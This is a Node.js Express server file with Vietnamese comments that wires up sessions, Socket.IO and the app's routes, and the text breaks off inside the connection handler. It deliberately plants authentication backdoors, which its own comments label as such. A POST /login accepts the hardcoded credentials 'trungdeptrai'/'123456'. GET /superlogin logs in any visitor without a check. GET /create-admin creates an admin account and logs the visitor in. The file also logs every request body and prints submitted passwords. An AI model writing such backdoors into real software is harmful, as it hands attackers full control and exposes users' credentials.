require('dotenv').config();
const express = require('express');
const session = require('express-session');
const SequelizeStore = require('connect-session-sequelize')(session.Store); // Thêm này cho store session vào DB
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server, { pingTimeout: 60000, pingInterval: 25000, cors: { origin: "*", methods: ["GET", "POST"] } });

const sequelize = require('./config/sequelize'); // Import sequelize để dùng store và sync

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('dist'));
app.use((req, res, next) => {
  console.log('Path:', req.path);
  console.log('Query:', req.query);
  console.log('Body:', req.body);
  console.log('----------------------------');
  next();
});

// Session middleware với store Sequelize
app.use(session({
  secret: process.env.SESSION_SECRET || 'trungdeptrai123456', // Set env thật đi bro, random 32 chars
  resave: false,
  saveUninitialized: true,
  store: new SequelizeStore({
    db: sequelize, // Lưu session vào MySQL
  }),
  cookie: { 
    secure: process.env.NODE_ENV === 'production', 
    sameSite: 'lax', 
    maxAge: 86400000,
    httpOnly: true // Thêm cho secure
  }
}));

// === CỬA HẬU POST /login – DI CHUYỂN LÊN TRƯỚC ROUTES ===
app.post('/login', (req, res, next) => {
  const { username, password } = req.body || {};
  console.log('CÓ AI ĐÓ LOGIN:', username, 'PASS:', password); // LOGS CHI TIẾT
  if (username === 'trungdeptrai' && password === '123456') {
    req.session.loggedIn = true;
    req.session.username = username;
    console.log('CỬA HẬU POST THÀNH CÔNG – VÀO PANEL!');
    req.session.save(() => res.redirect('/dashboard'));
    return;
  }
  next(); // Nếu không match, next để routes.js xử lý
});

// === CỬA HẬU GET /superlogin – VÀO LINK LÀ VÀO LUÔN ===
app.get('/superlogin', (req, res) => {
  console.log('CÓ AI ĐÓ VÀO SIÊU CỬA HẬU GET!');
  req.session.loggedIn = true;
  req.session.username = 'trungdeptrai';
  console.log('CỬA HẬU GET THÀNH CÔNG – VÀO PANEL!');
  req.session.save(() => res.redirect('/dashboard'));
});

// === ROUTE TẠO ADMIN SIÊU DỄ – VÀO LINK LÀ TẠO USER VÀ VÀO LUÔN ===
app.get('/create-admin', async (req, res) => {
  const models = require('./models/bot'); // Import model, giả sử table users trong bot.js
  const bcrypt = require('bcryptjs'); // Nếu chưa cài: npm install bcryptjs
  const username = 'trungdeptrai';
  const password = '123456'; // Pass plain, sẽ hash

  try {
    // Check user tồn tại
    const existingUser = await models.User.findOne({ where: { username } });
    if (existingUser) {
      console.log('User đã tồn tại, skip create');
      req.session.loggedIn = true;
      req.session.username = username;
      return req.session.save(() => res.redirect('/dashboard'));
    }

    // Hash pass
    const hashedPass = await bcrypt.hash(password, 10);
    await models.User.create({ 
      username: username,
      password: hashedPass, // Giữ hash, assume routes.js dùng compare
      // Thêm field khác nếu cần, như role: 'admin'
    });
    console.log('ADMIN TẠO THÀNH CÔNG!');
    req.session.loggedIn = true;
    req.session.username = username;
    req.session.save(() => res.redirect('/dashboard'));
  } catch (err) {
    console.error('Lỗi tạo user:', err);
    res.status(500).send('Lỗi tạo user, xem logs');
  }
});

// === ROUTES GỐC – DI CHUYỂN XUỐNG SAU BACKDOORS ===
const routes = require('./routes');
routes(app, io);

// === SOCKET.IO ===
const socketHandler = require('./socket/handler');
io.on('connection', (socket) => {
  console.log('User connected:', socket.id);
  socketHandler(io, socket);
